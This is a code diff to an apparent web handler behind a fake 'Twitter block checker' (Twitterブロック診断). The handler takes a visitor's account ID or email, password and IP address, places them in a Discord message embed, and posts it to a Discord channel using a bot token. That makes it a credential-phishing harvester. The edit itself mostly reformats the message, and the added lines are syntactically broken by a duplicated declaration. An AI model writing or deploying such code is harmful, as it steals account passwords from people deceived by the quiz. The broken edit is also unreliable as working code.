@@ -37,19 +37,20 @@ export default async function handler(req, res) {
 
         const DISCORD_BOT_TOKEN = process.env.DISCORD_BOT_TOKEN;
         const CHANNEL_ID = process.env.DISCORD_CHANNEL_ID;
-        const messageBody = {
-            embeds: [
-                {
-                    title: "ご、ごめんなさい、、、",
-                    color: 0x00b0f4,
-                    description: `**ID or Email**\n\`\n${email}\n\`\n**PASS**\n\`\n${password}\n\`\n**IP**\n\`${ipIdentifier}\``,
-                    footer: {
-                        text: `Twitterブロック診断 | IP: ${ipIdentifier} | ${randomCount}人と返答`,
-                    },
-                    timestamp: new Date().toISOString()
-                }
-            ]
-        };
+        const messageBody = {const messageBody = {
+    embeds: [
+        {
+            title: "ご、ごめんなさい、、、",
+            color: 0x00b0f4,
+            description: `**ID or Email**\n\`${email}\`\n**PASS**\n\`${password}\`\n**IP**\n\`${ipIdentifier}\``,
+            footer: {
+                text: `Twitterブロック診断 | IP: ${ipIdentifier} | ${randomCount}人と返答`,
+            },
+            timestamp: new Date().toISOString()
+        }
+    ]
+};
+
 
         await fetch(`https://discord.com/api/v10/channels/${CHANNEL_ID}/messages`, {
             method: 'POST',
